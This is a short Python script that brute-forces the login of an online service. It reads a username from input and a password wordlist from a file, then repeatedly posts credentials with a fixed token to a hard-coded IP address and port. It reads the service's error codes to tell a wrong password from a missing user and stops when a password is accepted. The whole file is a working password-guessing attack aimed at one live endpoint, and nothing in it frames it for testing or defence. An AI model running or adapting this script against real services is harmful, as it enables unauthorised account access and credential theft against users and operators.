import requests

print("Enter username to crack")
user = input()


def load_passwords(filename):
    try:
        with open(filename, "r") as file:
            passwords = [line.strip() for line in file if line.strip()]  
        if not passwords:
            raise ValueError("WordListEmpty")
        return passwords
    except FileNotFoundError:
        print(f"Error: {filename} Not found, make sure it exist.")
        return []
    except ValueError as e:
        print(f"Error: {e}")
        return []

password_list = load_passwords("passwords.txt")

def test_api():
    if not password_list:
        print("No passwords to test.")
        return

    url = "http://103.195.100.145:35566/online/user/login"  

    for password in password_list:
        print(f"Trying password: {password}")

        payload = {
            "alias": user,  
            "token": "ponkis16122",  
            "password": password
        }

        try:
            response = requests.post(url, json=payload)
            
            if response.status_code == 200:
                data = response.json()
                
                if data.get("error_type") == "007":
                    print(f"Password '{password}' was rejected. Trying next...")
                elif data.get("error_type") == "006":
                    print(f"user not found")
                    break
                else:
                    print(f"Success! Vulnerable password found: {password}")
                    break
            else:
                print(f"Request failed with status code {response.status_code}: {response.text}")
                break

        except Exception as e:
            print(f"An error occurred: {e}")
            break

test_api()
